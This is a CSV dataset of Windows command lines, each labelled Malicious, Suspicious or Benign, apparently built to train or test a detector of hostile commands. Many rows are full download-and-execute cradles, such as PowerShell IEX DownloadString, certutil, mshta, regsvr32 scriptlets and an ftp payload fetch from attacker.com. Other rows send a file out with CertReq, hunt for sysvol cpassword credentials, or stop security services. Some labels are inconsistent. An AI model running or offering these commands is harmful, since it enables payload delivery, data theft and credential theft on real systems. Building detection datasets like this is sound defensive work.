Prompt,Label,Type
"rundll32.exe ieadvpack.dll,LaunchINFSection default.inf",Malicious,command
powershell IEX((New-Object Net.WebClient).DownloadString('http://host.ps1')),Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://192.168.1.100/script.hta",Malicious,command
MpCmdRun.exe -DownloadFile -url http://192.168.1.101/drop.exe -path C:\temp\drop.exe,Malicious,command
"mshta vbscript:Execute(""GetObject(""script:http://malicious.script\"")"")",Malicious,command
reg import lock.reg,Suspicious,command
net use t: \\share\docs,Suspicious,command
"pcalua.exe -a mshta.exe -argumentlist ""http://attacker/file.hta""",Suspicious,command
"explorer.exe /select,C:\Windows\Temp\file.exe",Suspicious,command
taskkill /f /im explorer.exe,Suspicious,command
bitsadmin /SetNotifyCmdLine 1 evil.exe NULL,Suspicious,command
"sc stop ""Security Center""",Suspicious,command
rasautou -d inject.dll -p shell -a a -e e,Suspicious,command
ftp -s:attack.txt,Suspicious,command
cmstp.exe /ni /s \setup\evil.inf,Suspicious,command
xwizard RunWizard {CLSID} /zhttp://remote/lure,Suspicious,command
reg load HKLM\CONFIG hive.dat,Suspicious,command
powershell -windowstyle hidden -file load.ps1,Suspicious,command
"rundll32.exe shell32.dll,Control_RunDLL hijack.dll",Suspicious,command
"forfiles /m *.exe /c ""cmd /c echo File: @file""",Suspicious,command
whoami,Benign,command
ipconfig,Benign,command
ping www.google.com,Benign,command
hostname,Benign,command
shutdown /s /f /t 60,Benign,command
net user,Benign,command
"tasklist /fi ""imagename eq svchost.exe""",Benign,command
chkdsk C:,Benign,command
fsutil fsinfo drives,Benign,command
cls,Benign,command
systeminfo,Benign,command
echo Hello ZHAAN,Benign,command
sc query,Benign,command
"start """" notepad.exe",Benign,command
explorer.exe,Benign,command
title ZHAAN CLI,Benign,command
type changelog.txt,Benign,command
del /q /f *.log,Benign,command
netstat -an,Benign,command
"rundll32.exe ieadvpack.dll,LaunchINFSection loader.inf",Malicious,command
powershell IEX(New-Object Net.WebClient).DownloadString('http://ip/script.ps1'),Malicious,command
certutil -urlcache -split -f http://evil.net/deliver.exe drop.exe,Malicious,command
"mshta vbscript:Execute(""GetObject(""script:https://c2.site/drop.sct\"")"")",Malicious,command
"rundll32 advpack.dll,RegisterOCX run.ocx",Malicious,command
"rundll32 zipfldr.dll,RouteTheCall \remote\evil.dll",Malicious,command
MpCmdRun.exe -DownloadFile -url http://host.local/backdoor.exe -path C:\temp\bdoor.exe,Malicious,command
AppVLP.exe \\c2host\infect.bat,Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 trojan.inf",Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication javascript:alert(""exec"")",Malicious,command
powershell Invoke-WebRequest http://site.com/file.ps1 -OutFile C:\Users\Public\file.ps1,Malicious,command
diantz.exe \\net\load.exe C:\inject\pack.cab,Malicious,command
"rundll32.exe advpack.dll,LaunchINFSection \path\to\install.inf",Malicious,command
dotnet.exe loader.dll,Malicious,command
"SyncAppvPublishingServer.vbs ""IEX(iwr('http://remote/pshell.ps1'))""",Malicious,command
configsecuritypolicy.exe key.exe https://api.payload/exec,Malicious,command
msbuild.exe rogue.xml,Malicious,command
regsvr32 /s /n /u /i:http://back.net/exploit.sct scrobj.dll,Malicious,command
replace.exe \\host\x.exe C:\users\shared /A,Malicious,command
extrac32 /Y /C \\192.168.1.15\file.cab C:\extract\e.exe,Malicious,command
certreq -Post -config https://host/evil.conf,Malicious,command
"rundll32.exe shell32.dll,ShellExec_RunDLL http://update.remote/download.exe",Malicious,command
ilasm.exe /dll stage.il,Malicious,command
"rundll32.exe zipfldr.dll,RouteTheCall http://evil.com/drop.dll",Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://evil.com/main.hta",Malicious,command
regsvcs.exe back.inf,Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 payload.inf",Malicious,command
"rundll32 shdocvw.dll,OpenURL http://c2/command",Malicious,command
makecab \network\cmd.exe C:\archive\cmd.cab,Malicious,command
"mshta vbscript:Execute(""GetObject(""script:http://update.lol/script.sct\"")"")",Malicious,command
certutil -decode encoded64.txt decoded.exe,Malicious,command
MpCmdRun.exe -DownloadFile -url http://control/drop.exe -path C:\download\drop.exe,Malicious,command
"rundll32.exe advpack.dll,RegisterOCX evil.ocx",Malicious,command
wscript.exe \\net\payload.vbs,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://dropper.hta",Malicious,command
installutil.exe /U loader.dll,Malicious,command
powershell -enc JAB...,Malicious,command
"rundll32 setupapi.dll,InstallHinfSection DefaultInstall 132 evil.inf",Malicious,command
powershell -ep bypass -file runner.ps1,Malicious,command
sc delete wuauserv,Suspicious,command
reg load HKLM\ALT hive.alt,Suspicious,command
net stop BITS,Suspicious,command
bitsadmin /SetNotifyCmdLine 1 \evil\file.exe NULL,Suspicious,command
cmstp.exe /ni /s malware.inf,Suspicious,command
"explorer.exe /select,C:\Windows\Temp\evil.txt",Suspicious,command
pcalua.exe -a C:\mal.exe,Suspicious,command
powershell Start-Process evil.bat,Suspicious,command
rasautou -d lib.dll -p main -a a -e e,Suspicious,command
sc stop spooler,Suspicious,command
"rundll32.exe shell32.dll,Control_RunDLL fake.dll",Suspicious,command
xwizard RunWizard {GUID} /zhttp://host.cmd,Suspicious,command
print /D:C:\ADS\copy.exe:file.exe C:\ADS\copy.exe,Suspicious,command
ftp -s:transfer.txt,Suspicious,command
"forfiles /m *.exe /c ""cmd /c ren @file *.bak""",Suspicious,command
cmd /c start \remote\action.bat,Suspicious,command
whoami,Benign,command
ipconfig /all,Benign,command
hostname,Benign,command
net user,Benign,command
tasklist,Benign,command
sc query,Benign,command
"echo ""System Secured""",Benign,command
powershell Get-Command,Benign,command
cls,Benign,command
shutdown /a,Benign,command
chkdsk /scan,Benign,command
fsutil fsinfo drives,Benign,command
net localgroup,Benign,command
type report.txt,Benign,command
del /f /q *.tmp,Benign,command
"start """" ""notepad.exe""",Benign,command
gpresult /h results.html,Benign,command
title ZHAAN Monitor,Benign,command
copy C:\info.txt D:\backup\info.txt,Benign,command
powershell IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.5/shell.ps1'),Malicious,command
certutil -urlcache -split -f http://malicious.org/file.exe out.exe,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://10.0.0.2/script.hta",Malicious,command
"mshta vbscript:Execute(""GetObject(""script:http://attack.host/payload.sct\"")"")",Malicious,command
"rundll32.exe advpack.dll,RegisterOCX C:\Users\user\evil.ocx",Malicious,command
msbuild.exe dropper.xml,Malicious,command
"rundll32 zipfldr.dll,RouteTheCall \net\dlls\loader.dll",Malicious,command
MpCmdRun.exe -DownloadFile -url https://192.168.0.4/infect.exe -path C:\Users\temp\run.exe,Malicious,command
"rundll32 setupapi.dll,InstallHinfSection DefaultInstall 132 install.inf",Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection malware.inf",Malicious,command
"rundll32.exe shdocvw.dll,OpenURL http://api.server/start",Malicious,command
wscript.exe \domain\scripts\remote.vbs,Malicious,command
"rundll32.exe advpack.dll,LaunchINFSection inf.inf",Malicious,command
powershell -ep bypass -file install.ps1,Malicious,command
ilasm.exe /dll evil.il,Malicious,command
AppVLP.exe \\192.168.0.10\autorun.bat,Malicious,command
extrac32 /Y /C \\10.10.10.3\cabinet.cab C:\out\exploit.exe,Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 script.inf",Malicious,command
"SyncAppvPublishingServer.vbs ""IEX((New-Object Net.WebClient).DownloadString('http://bad.ps1'))""",Malicious,command
dotnet.exe \drop\code.dll,Malicious,command
replace.exe \\evil\payload.exe C:\Windows\Temp /A,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication javascript:document.write('exploit')",Malicious,command
"powershell -windowstyle hidden -Command ""IEX(iwr('http://host/payload'))""",Malicious,command
"rundll32.exe advpack.dll,RegisterOCX \attacker\load.ocx",Malicious,command
"rundll32.exe zipfldr.dll,RouteTheCall back.dll",Malicious,command
"rundll32 shell32.dll,ShellExec_RunDLL http://mal.site/cmd.exe",Malicious,command
regsvcs.exe install.dll,Malicious,command
"rundll32.exe ieadvpack.dll,LaunchINFSection bad.inf",Malicious,command
"rundll32 setupapi.dll,InstallHinfSection DefaultInstall 132 backdoor.inf",Malicious,command
makecab \net\cmd.exe C:\payload\cmd.cab,Malicious,command
"mshta vbscript:Execute(""GetObject(""script:http://remote/script.sct\"")"")",Malicious,command
MpCmdRun.exe -DownloadFile -url http://ip/install.exe -path C:\Setup\install.exe,Malicious,command
certreq -Post -config https://attack/control.conf,Malicious,command
"rundll32.exe shdocvw.dll,OpenURL http://payload.url",Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://192.168.100.1/payload.hta",Malicious,command
powershell IEX((New-Object Net.WebClient).DownloadString('http://c2/m.ps1')),Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection malware.inf",Malicious,command
configsecuritypolicy.exe monitor.exe https://malicious.site/hook,Malicious,command
"rundll32.exe advpack.dll,RegisterOCX payload.ocx",Malicious,command
"rundll32.exe zipfldr.dll,RouteTheCall C:\inetpub\shell.dll",Malicious,command
pcalua.exe -a \network\path\dropper.exe,Suspicious,command
ftp -s:uploadfile.txt,Suspicious,command
powershell Start-Process bad.ps1,Suspicious,command
cmstp.exe /ni /s evil.inf,Suspicious,command
"explorer.exe /select,C:\Windows\Temp\hidden.exe",Suspicious,command
bitsadmin /SetNotifyCmdLine 1 dropper.exe NULL,Suspicious,command
reg import stealth.reg,Suspicious,command
sc stop cryptsvc,Suspicious,command
"rundll32.exe shell32.dll,Control_RunDLL malicious.dll",Suspicious,command
taskkill /f /im wininit.exe,Suspicious,command
net stop securitycenter,Suspicious,command
rasautou -d dynamic.dll -p payload -a a -e e,Suspicious,command
xwizard RunWizard {GUID} /zhttp://command.domain,Suspicious,command
print /D:C:\copy.exe:file.exe C:\copy.exe,Suspicious,command
"forfiles /m *.dll /c ""cmd /c echo @file""",Suspicious,command
sc delete eventlog,Suspicious,command
whoami,Benign,command
ipconfig,Benign,command
ping 8.8.4.4,Benign,command
hostname,Benign,command
net user,Benign,command
chkdsk /f,Benign,command
tasklist,Benign,command
shutdown /s /t 30,Benign,command
systeminfo,Benign,command
sc query windefend,Benign,command
cls,Benign,command
echo ZHAAN monitoring logs...,Benign,command
netstat -a,Benign,command
fsutil fsinfo drives,Benign,command
powershell Get-Help,Benign,command
explorer.exe,Benign,command
title ZHAAN Console,Benign,command
gpupdate,Benign,command
copy C:\config.ini D:\backup\config.ini,Benign,command
del /f /q *.bak,Benign,command
"rundll32.exe shdocvw.dll,OpenURL http://mal.host/run.exe",Malicious,command
powershell IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.2/exploit.ps1'),Malicious,command
certutil -urlcache -split -f http://control.net/file.exe C:\temp\load.exe,Malicious,command
"mshta vbscript:Execute(""GetObject(""script:http://injector/evil.sct\"")"")",Malicious,command
"rundll32 advpack.dll,RegisterOCX drop.ocx",Malicious,command
"rundll32 zipfldr.dll,RouteTheCall \attacker\evil.dll",Malicious,command
MpCmdRun.exe -DownloadFile -url http://host.local/back.exe -path C:\output\back.exe,Malicious,command
"rundll32 setupapi.dll,InstallHinfSection DefaultInstall 132 malware.inf",Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://192.168.1.15/drop.hta",Malicious,command
extrac32 /Y /C \\192.168.0.8\payload.cab C:\staging\evil.exe,Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection exploit.inf",Malicious,command
configsecuritypolicy.exe C:\evil.exe https://api.bad/inject,Malicious,command
AppVLP.exe \\10.0.0.5\autorun.bat,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication javascript:window.exec(""backdoor"")",Malicious,command
"rundll32.exe advpack.dll,LaunchINFSection setup.inf",Malicious,command
makecab \mal.host\cmd.exe C:\cabinet\cmd.cab,Malicious,command
regsvcs.exe C:\dlls\loader.dll,Malicious,command
msbuild.exe exec.xml,Malicious,command
dotnet.exe C:\apps\drop.dll,Malicious,command
"rundll32.exe advpack.dll,RegisterOCX back.ocx",Malicious,command
"rundll32.exe zipfldr.dll,RouteTheCall payload.dll",Malicious,command
"rundll32 shell32.dll,ShellExec_RunDLL http://10.0.0.9/drop.exe",Malicious,command
"powershell -nop -ep bypass -Command ""IEX(iwr('http://192.168.0.7/load.ps1'))""",Malicious,command
wscript.exe \\net\remote.vbs,Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 back.inf",Malicious,command
"SyncAppvPublishingServer.vbs ""IEX(iwr('http://evil/loader.ps1'))""",Malicious,command
"rundll32.exe ieadvpack.dll,LaunchINFSection tool.inf",Malicious,command
"rundll32.exe shdocvw.dll,OpenURL http://192.168.0.16/start.exe",Malicious,command
MpCmdRun.exe -DownloadFile -url http://bad/api/start.exe -path C:\users\admin\s.exe,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://mal.local/command.hta",Malicious,command
certreq -Post -config https://controller/policy.cfg,Malicious,command
"rundll32.exe advpack.dll,RegisterOCX control.ocx",Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 ldr.inf",Malicious,command
"rundll32 zipfldr.dll,RouteTheCall \dropzone\rundll.dll",Malicious,command
ilasm.exe /exe payload.il,Malicious,command
installutil.exe /U dropper.dll,Malicious,command
"rundll32.exe advpack.dll,LaunchINFSection patch.inf",Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication javascript:eval(""exploit"")",Malicious,command
makecab exploit.exe exploit.cab,Malicious,command
bitsadmin /transfer job /download /priority FOREGROUND http://bad.site/f.exe f.exe,Malicious,command
"explorer.exe /select,C:\Windows\System32\secret.dll",Suspicious,command
"sc stop ""Windows Firewall""",Suspicious,command
reg load HKLM\OFFSYS config.dat,Suspicious,command
powershell Start-Process dropper.ps1,Suspicious,command
ftp -n -s:attack_script.txt,Suspicious,command
cmstp.exe /ni /s loader.inf,Suspicious,command
pcalua.exe -a http://malicious/payload.exe,Suspicious,command
taskkill /f /im services.exe,Suspicious,command
xwizard RunWizard {GUID} /zhttp://attacker/lure,Suspicious,command
rasautou -d hack.dll -p win -a a -e e,Suspicious,command
"rundll32.exe shell32.dll,Control_RunDLL attacker.dll",Suspicious,command
reg import stealth_config.reg,Suspicious,command
print /D:C:\host.exe:file.exe C:\host.exe,Suspicious,command
bitsadmin /SetNotifyCmdLine 1 stealth.exe NULL,Suspicious,command
sc delete browser,Suspicious,command
"forfiles /m *.vbs /c ""cmd /c attrib +s +h @file""",Suspicious,command
whoami,Benign,command
ipconfig,Benign,command
net user,Benign,command
hostname,Benign,command
chkdsk,Benign,command
tasklist,Benign,command
cls,Benign,command
shutdown /r /t 10,Benign,command
systeminfo,Benign,command
sc query wuauserv,Benign,command
"echo ""ZHAAN session started""",Benign,command
powershell Get-ExecutionPolicy,Benign,command
gpupdate /force,Benign,command
title ZHAAN Ops Terminal,Benign,command
del /q /f *.log,Benign,command
copy /y C:\logs\zhaan.txt D:\backup\zhaan.txt,Benign,command
fsutil fsinfo drives,Benign,command
explorer.exe,Benign,command
"start """" notepad.exe",Benign,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 loader.inf",Malicious,command
powershell IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.20/evil.ps1'),Malicious,command
"mshta vbscript:Execute(""GetObject(""script:https://control.net/execute.sct\"")"")",Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://attacker.lan/back.hta",Malicious,command
certutil -urlcache -split -f http://host/dropper.exe dropper.exe,Malicious,command
"rundll32.exe advpack.dll,RegisterOCX inject.ocx",Malicious,command
MpCmdRun.exe -DownloadFile -url http://evil.local/drop.exe -path C:\mal\drop.exe,Malicious,command
"rundll32 zipfldr.dll,RouteTheCall payload.dll",Malicious,command
AppVLP.exe \\control\evil.bat,Malicious,command
makecab \\c2\evil.exe C:\cab\evil.cab,Malicious,command
"rundll32 shell32.dll,ShellExec_RunDLL http://malicious/payload.exe",Malicious,command
"rundll32.exe shdocvw.dll,OpenURL http://c2.local/command",Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection malware.inf",Malicious,command
regsvcs.exe C:\attack\ldr.dll,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication javascript:evilcode()",Malicious,command
dotnet.exe C:\dropzone\inject.dll,Malicious,command
"rundll32.exe advpack.dll,LaunchINFSection evil.inf",Malicious,command
extrac32 /Y /C \\network\cab.cab C:\temp\evil.dll,Malicious,command
"rundll32.exe ieadvpack.dll,RegisterOCX C:\ocx\mal.ocx",Malicious,command
installutil.exe /U infector.dll,Malicious,command
"rundll32.exe zipfldr.dll,RouteTheCall C:\hidden\run.dll",Malicious,command
"rundll32.exe advpack.dll,RegisterOCX shell.ocx",Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 cmd.inf",Malicious,command
"SyncAppvPublishingServer.vbs ""IEX((iwr('http://payload.local/script.ps1')))""",Malicious,command
"rundll32.exe shdocvw.dll,OpenURL http://c2.remote/run",Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://cmd.drop/exploit.hta",Malicious,command
powershell -ep bypass -file exploit.ps1,Malicious,command
ilasm.exe /exe payload.il,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication javascript:alert(""you've been hit"")",Malicious,command
MpCmdRun.exe -DownloadFile -url http://c2.domain/back.exe -path C:\target\b.exe,Malicious,command
certreq -Post -config https://mal.domain/conf.ini,Malicious,command
"rundll32 setupapi.dll,InstallHinfSection DefaultInstall 132 shell.inf",Malicious,command
configsecuritypolicy.exe sysinfo.exe https://tracker.xyz/send,Malicious,command
"rundll32 advpack.dll,RegisterOCX bypass.ocx",Malicious,command
msbuild.exe attack.xml,Malicious,command
powershell IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')),Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 code.inf",Malicious,command
"rundll32 zipfldr.dll,RouteTheCall \attacker\inject.dll",Malicious,command
makecab C:\cmd.exe C:\cab\cmd.cab,Malicious,command
powershell -enc JAB...,Malicious,command
taskkill /f /im lsass.exe,Suspicious,command
sc delete themes,Suspicious,command
reg load HKLM\SYS hive.sys,Suspicious,command
pcalua.exe -a shell.bat,Suspicious,command
"explorer.exe /select,C:\Users\Public\hidden.exe",Suspicious,command
bitsadmin /SetNotifyCmdLine 1 infect.exe NULL,Suspicious,command
reg import attack.reg,Suspicious,command
ftp -n -s:fetch.txt,Suspicious,command
cmstp.exe /ni /s sys.inf,Suspicious,command
powershell Start-Process launch.bat,Suspicious,command
"rundll32.exe shell32.dll,Control_RunDLL execute.dll",Suspicious,command
rasautou -d injected.dll -p remote -a a -e e,Suspicious,command
print /D:C:\print.exe:file.exe C:\print.exe,Suspicious,command
xwizard RunWizard {CLSID} /zhttp://link.domain/payload,Suspicious,command
"forfiles /m *.ps1 /c ""cmd /c echo @file""",Suspicious,command
shutdown /r /t 0,Benign,command
ipconfig,Benign,command
whoami,Benign,command
hostname,Benign,command
chkdsk C:,Benign,command
echo ZHAAN audit active,Benign,command
"tasklist /fi ""status eq running""",Benign,command
net user,Benign,command
netstat -r,Benign,command
fsutil fsinfo drives,Benign,command
powershell Get-HotFix,Benign,command
title ZHAAN Real-Time Monitor,Benign,command
del /q /f *.bak,Benign,command
systeminfo,Benign,command
gpupdate,Benign,command
sc query bits,Benign,command
"start """" notepad.exe",Benign,command
cls,Benign,command
copy config.txt D:\backups\config.txt,Benign,command
start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw,Malicious,command
start ms-appinstaller://?source=https://10.101.10.10/raw/tdyShwLw,Malicious,command
start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw,Malicious,command
C:\\Windows\\System32\\at.exe at 09:00 /interactive /every:m,Malicious,command
ATBroker.exe /start malware,Malicious,command
bash.exe -c calc.exe,Suspicious,command
bash.exe -c calc.exe,Suspicious,command
bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,Malicious,command
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,Malicious,command
bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,Malicious,command
bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,Malicious,command
CertReq -Post -config https://example.org/ c:\\windows\\win.ini output.txt,Malicious,command
CertReq -Post -config https://example.org/ c:\\windows\\win.ini and show response in terminal,Malicious,command
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,Malicious,command
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt,Malicious,command
certutil -encode inputFileName encodedOutputFileName,Malicious,command
certutil -decode encodedInputFileName decodedOutputFileName,Malicious,command
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat,Malicious,command
cmdkey /list,Benign,command
cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf,Malicious,command
cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf,Malicious,command
ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://10.10.10.10/xxxxxxxxx?encodedfile,Malicious,command
ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://11.11.11.11/xxxxxxxxx?encodedfile,Malicious,command
ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile,Suspicious,command
control.exe c:\\windows\\tasks\\file.txt:evil.dll,Suspicious,command
csc.exe -out:My.exe File.cs,Suspicious,command
cscript c:\\ads\\file.txt:script.vbs,Suspicious,command
DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile,Malicious,command
DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://11.11.11.11/xxxxxxxxx?encodedfile,Malicious,command
DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://10.10.10.10/xxxxxxxxx?encodedfile,Malicious,command
"set ""SYSTEMROOT=C:\\Windows\\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr",Malicious,command
rundll32.exe dfshim.dll,Suspicious,command
diantz.exe c:\\pathToFile\\file.exe c:\\destinationFolder\\targetFile.txt:targetFile.cab,Malicious,command
diantz.exe \\\\remotemachine\\pathToFile\\file.exe c:\\destinationFolder\\file.cab,Suspicious,command
diantz.exe \\\\11.121.12.13\\pathToFile\\file.exe c:\\destinationFolder\\file.cab,Malicious,command
diantz.exe \\\\10.10.10.10\\pathToFile\\file.exe c:\\destinationFolder\\file.cab,Malicious,command
diskshadow.exe /s c:\\test\\diskshadow.txt,Suspicious,command
diskshadow> exec calc.exe,Suspicious,command
dllhost.exe /Processid:{CLSID},Suspicious,command
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\192.168.0.149\\dll\\wtf.dll,Malicious,command
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\193.168.0.149\\dll\\wtf.dll,Malicious,command
dnscmd.exe 10.10.10.10 /config /serverlevelplugindll \\\\193.168.0.149\\dll\\wtf.dll,Malicious,command
esentutl.exe /y C:\\folder\\sourcefile.vbs /d C:\\folder\\destfile.vbs /o,Malicious,command
esentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe /o,Malicious,command
esentutl.exe /y \\\\live.sysinternals.com\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o,Malicious,command
esentutl.exe /y \\\\11.11.11.11\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o,Malicious,command
esentutl.exe /y \\\\10.10.10.10\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o,Malicious,command
eventvwr.exe,Benign,command
expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.bat,Suspicious,command
expand c:\\ADS\\file1.bat c:\\ADS\\file2.bat,Suspicious,command
expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.txt:file.bat,Suspicious,command
expand \\\\11.12.13.14\\folder\\file.bat c:\\ADS\\file.txt:file.bat,Malicious,command
expand \\\\10.10.10.10\\folder\\file.bat c:\\ADS\\file.txt:file.bat,Malicious,command
explorer.exe /root,Benign,command
Extexport.exe c:\\test foo bar,Suspicious,command
extrac32 C:\\ADS\\procexp.cab c:\\ADS\\file.txt:procexp.exe,Suspicious,command
extrac32 /Y /C \\\\webdavserver\\share\\test.txt C:\\folder\\test.txt,Malicious,command
extrac32.exe /C C:\\Windows\\System32\\calc.exe C:\\Users\\user\\Desktop\\calc.exe,Malicious,command
findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\file.exe > c:\\ADS\\file.txt:file.exe,Malicious,command
findstr /S /I cpassword \\\\sysvol\\policies\\*.xml,Malicious,command
findstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.exe,Malicious,command
forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe,Malicious,command
"forfiles /p c:\\windows\\system32 /m notepad.exe /c ""c:\\folder\\normal.dll:evil.exe""",Malicious,command
echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt,Malicious,command
"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",Malicious,command
"cmd.exe /c ""@echo open 11.11.11.11 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",Malicious,command
"cmd.exe /c ""@echo open 10.10.10.10 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",Malicious,command
"C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe ""URL"" ""DESTINATION FILE""",Suspicious,command
Gpscript /logon,Benign,command
HH.exe http://some.url/script.ps1,Suspicious,command
HH.exe c:\\windows\\system32\\calc.exe,Suspicious,command
ie4uinit.exe -BaseSettings,Benign,command
ieexec.exe http://x.x.x.x:8080/bypass.exe,Malicious,command
ieexec.exe http://10.10.10.10:8080/bypass.exe,Suspicious,command
